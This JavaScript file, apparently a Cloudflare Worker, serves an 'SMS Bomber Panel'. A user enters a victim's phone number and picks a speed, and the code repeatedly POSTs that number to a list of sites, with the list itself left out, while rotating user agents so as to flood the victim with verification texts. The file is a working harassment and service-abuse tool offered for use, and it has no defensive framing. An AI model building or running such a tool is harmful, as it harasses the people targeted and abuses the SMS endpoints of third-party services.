addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
  });
  
  async function handleRequest(request) {
    const url = new URL(request.url);
    const path = url.pathname;
  
    if (path === '/') {
      return new Response(panelPage, { headers: { 'Content-Type': 'text/html' } });
    } else if (path === '/send') {
      const formData = await request.formData();
      const number = formData.get('number');
      const mood = formData.get('mood');
  
      const result = await sendSMS(number, mood);
  
      return new Response(JSON.stringify(result), { headers: { 'Content-Type': 'application/json' } });
    } else {
      return new Response('404 Not Found', { status: 404 });
    }
  }
  
  async function sendSMS(number, mood) {
    const sites = [
      // ... (list of sites)
    ];
  
    const user_agents = [
      // ... (list of user agents)
    ];
  
    const user_agent = user_agents[Math.floor(Math.random() * user_agents.length)];
  
    let rounds, delay, round_delay;
    if (mood === '1') {
      rounds = 2;
      delay = 3.50;
      round_delay = 1;
    } else if (mood === '2') {
      rounds = 3;
      delay = 0.50;
      round_delay = 1;
    } else {
      return { error: 'Invalid mood. Please enter 1 or 2.' };
    }
  
    const results = [];
  
    for (let round = 0; round < rounds; round++) {
      for (const site of sites) {
        const url = site.url;
        const json = site.json;
        json.mobile = '0' + number;
        json.phoneNumber = number;
        json.phone = '0' + number;
        json.phone_number = '0' + number;
        json.cell_number = '0' + number;
        json.username = '0' + number;
  
        const headers = { 'User-Agent': user_agent };
  
        const start_time = Date.now();
  
        const response = await fetch(url, {
          method: 'POST',
          headers: headers,
          body: JSON.stringify(json)
        });
  
        const end_time = Date.now();
        const duration = end_time - start_time;
  
        results.push({
          site: site.site,
          round: round + 1,
          status: response.status,
          duration: duration
        });
  
        await new Promise(resolve => setTimeout(resolve, delay * 1000));
      }
  
      await new Promise(resolve => setTimeout(resolve, round_delay * 1000));
    }
  
    return results;
  }
  
  const panelPage = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>SMS Bomber Panel</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f2f2f2;
        margin: 0;
        padding: 20px;
      }
      h1 {
        text-align: center;
        color: #333;
      }
      form {
        max-width: 400px;
        margin: 20px auto;
        background-color: #fff;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      }
      label {
        display: block;
        margin-bottom: 10px;
        color: #333;
      }
      input[type="text"],
      select {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        margin-bottom: 10px;
      }
      button {
        background-color: #4CAF50;
        color: #fff;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
      }
      button:hover {
        background-color: #45a049;
      }
      #result {
        max-width: 600px;
        margin: 20px auto;
        background-color: #fff;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
      }
      #result pre {
        white-space: pre-wrap;
        word-wrap: break-word;
      }
    </style>
  </head>
  <body>
    <h1>SMS Bomber Panel</h1>
    <form id="smsForm">
      <label for="number">Phone Number:</label>
      <input type="text" id="number" name="number" placeholder="Enter phone number" required>
  
      <label for="mood">Mood:</label>
      <select id="mood" name="mood">
        <option value="1">Normal</option>
        <option value="2">Fast</option>
      </select>
  
      <button type="submit">Send SMS</button>
    </form>
  
    <div id="result"></div>
  
    <script>
      const smsForm = document.getElementById('smsForm');
      const resultDiv = document.getElementById('result');
  
      smsForm.addEventListener('submit', async (e) => {
        e.preventDefault();
  
        const formData = new FormData(smsForm);
  
        const response = await fetch('/send', {
          method: 'POST',
          body: formData
        });
  
        const result = await response.json();
  
        resultDiv.innerHTML = '<pre>' + JSON.stringify(result, null, 2) + '</pre>';
      });
    </script>
  </body>
  </html>
  `;